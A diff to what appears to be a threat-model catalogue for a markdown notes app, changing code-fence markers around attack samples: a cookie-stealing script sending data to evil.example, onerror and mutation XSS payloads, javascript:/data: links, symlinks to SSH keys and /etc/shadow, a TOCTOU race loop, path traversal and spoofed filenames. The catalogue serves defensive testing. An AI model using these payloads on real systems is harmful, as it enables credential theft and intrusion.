@@ -173,7 +173,7 @@ it is a security change and needs review. That is the rule.
 
 ````markdown
 <script>fetch('https://evil.example/?d='+encodeURIComponent(document.cookie))</script>
-````
+````text
 
 ````markdown
 <img src=x onerror="require('child_process').exec('calc')">
@@ -216,7 +216,7 @@ becomes active when the string is serialized and reparsed.
 
 ```html
 <math><mtext><table><mglyph><style><img src=x onerror=alert(1)></style></mglyph></table></mtext></math>
-```
+```text
 
 ```html
 <svg><foreignObject><xmp><img src=x onerror=alert(1)></xmp></foreignObject></svg>
@@ -252,7 +252,7 @@ happens when an application re-contextualizes the output.
 
 ```markdown
 [click](vbscript:msgbox(1))
-```
+```text
 
 ```markdown
 [x](data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==)
@@ -268,7 +268,7 @@ happens when an application re-contextualizes the output.
 
 ```markdown
 [![](x)](  javascript:alert(1)  )
-```
+```text
 
 **Impact.** Script execution on click; data exfiltration; navigation of the
 app window to a phishing page.
@@ -306,7 +306,7 @@ image source, then observe it.
 
 ````markdown
 ![](\\\\evil-server\\share\\secret.png)
-````
+````text
 
 ```markdown
 ![](/etc/shadow)
@@ -579,7 +579,7 @@ write, or execute.
 # A7 plants this where our watcher will see it
 ln -s /home/victim/.ssh/id_rsa ~/notes/innocent.md
 ln -s /etc/shadow ~/notes/totally-fine.md
-```
+```text
 
 ```bash
 # Symlink loop to hang a recursive directory walk
@@ -589,7 +589,7 @@ mkdir -p ~/notes/a && ln -s ~/notes ~/notes/a/loop
 ```bash
 # TOCTOU: swap the file between our check and our read
 while :; do echo 'pwned' > /tmp/x.md; rm /tmp/x.md; ln -s ~/.ssh/id_rsa /tmp/x.md; done
-```
+```text
 
 **Impact.** Confidentiality via symlinked documents; availability via symlink
 loops in a directory walk; integrity via TOCTOU.
@@ -613,7 +613,7 @@ this is mostly a Linux concern. Junction points and hard links remain possible.
 
 ```
 mv notes.md notes.md.tmp && printf '# Half-written' > notes.md && mv notes.md.tmp notes.md &
-```
+```text
 
 Editor behaviours that produce garbage rather than an attack: write-in-place
 (truncate then write — we see a partial file), atomic-rename (we either see the
@@ -659,27 +659,27 @@ names zip-slip explicitly.
 
 ```
 ../../../../etc/passwd.md
-```
+```text
 
 ```
 CON.md
 NUL.md
 COM1.md
 aux.md          (Windows reserved device names)
-```
+```text
 
 ```
 notes.md::$DATA
-```
+```text
 
 ```
 notes
 .‮gnp.exe.md    (U+202E RIGHT-TO-LEFT OVERRIDE — displays as "notes.exe.md")
-```
+```text
 
 ```
 README.md      (U+200B zero-width spaces — invisible, looks like "README.md")
-```
+```text
 
 **Impact.** Path traversal via the file-open path; UI spoofing and
 extension-confusion via bidi/zero-width characters; device-path access on Windows.
